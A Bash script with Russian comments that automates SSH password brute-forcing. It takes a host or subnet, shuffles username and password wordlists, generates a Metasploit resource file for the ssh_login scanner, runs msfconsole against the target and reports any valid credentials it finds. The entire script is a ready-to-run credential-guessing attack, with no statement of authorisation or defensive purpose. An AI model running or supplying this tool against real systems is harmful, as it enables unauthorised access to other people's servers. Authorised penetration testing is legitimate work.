#!/bin/bash

if [ -z "$1" ]; then
    echo "Использование: $0 <RHOSTS>"
    echo "Пример: $0 192.168.1.50"
    echo "Пример: $0 10.0.0.0/24"
    exit 1
fi

TARGET="$1"
LOG_DIR="/home/arch/Desktop/git/access_scanner/logs"
LOG_FILE="${LOG_DIR}/ssh_scan_$(date +%Y%m%d_%H%M%S).log"

ORIGINAL_USER_FILE="/home/arch/Desktop/git/access_scanner/wordlists/usernames.txt"
ORIGINAL_PASS_FILE="/home/arch/Desktop/git/access_scanner/wordlists/500p.txt"

# Создаем директорию для логов, если её нет
mkdir -p "$LOG_DIR"

# Переменные для временных файлов выносим наверх, чтобы trap их видел
SHUFFLED_USER_FILE=$(mktemp /tmp/msf_users_XXXXXX.txt)
SHUFFLED_PASS_FILE=$(mktemp /tmp/msf_pass_XXXXXX.txt)
RC_FILE=$(mktemp /home/arch/Desktop/git/access_scanner/rcs/msf_ssh_login_XXXXXX.rc)

# Функция очистки при выходе (сработает всегда, даже при Ctrl+C)
cleanup() {
    echo -e "\n[+] Очистка временных файлов..."
    rm -f "$RC_FILE" "$SHUFFLED_USER_FILE" "$SHUFFLED_PASS_FILE"
    echo "[+] Готово."
}
trap cleanup EXIT

# Перемешивание словарей
echo "[+] Подготовка словарей..."
shuf "$ORIGINAL_USER_FILE" > "$SHUFFLED_USER_FILE"
shuf "$ORIGINAL_PASS_FILE" > "$SHUFFLED_PASS_FILE"

if ! command -v msfconsole &> /dev/null; then
    echo "[-] Ошибка: msfconsole не найден в системе." | tee -a "$LOG_FILE"
    exit 1
fi

echo "[+] Создание временного файла конфигурации Metasploit..."
cat << EOF > "$RC_FILE"
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $TARGET
set USER_FILE $SHUFFLED_USER_FILE
set PASS_FILE $SHUFFLED_PASS_FILE
set THREADS 5
set VERBOSE true
run
exit
EOF

echo "[+] Запуск msfconsole для цели: $TARGET..."
echo "[+] Вывод дублируется в лог: $LOG_FILE"

# Запуск msfconsole с перенаправлением вывода.
# tee и stdout, и stderr записывает в файл, сохраняя вывод на экране.
msfconsole -q -r "$RC_FILE" 2>&1 | tee -a "$LOG_FILE"

# Проверка кода завершения конвейера (PIPESTATUS[0] нужен, так как мы использовали tee)
MSF_EXIT_CODE=${PIPESTATUS[0]}

if [ $MSF_EXIT_CODE -ne 0 ]; then
    echo "[-] Metasploit завершился с ошибкой (Код: $MSF_EXIT_CODE)." | tee -a "$LOG_FILE"
    echo "[-] Проверьте файл лога для поиска причин (например, проблемы с сетью или синтаксисом)." | tee -a "$LOG_FILE"
    exit $MSF_EXIT_CODE
else
    # Проверяем, были ли успешные срабатывания в логе
    if grep -q "Success" "$LOG_FILE" || grep -q "SSH session" "$LOG_FILE"; then
        echo "[+] Сканирование завершено. Найдены валидные учётные данные!" | tee -a "$LOG_FILE"
    else
        echo "[+] Сканирование завершено. Успешных совпадений не найдено." | tee -a "$LOG_FILE"
    fi
fi
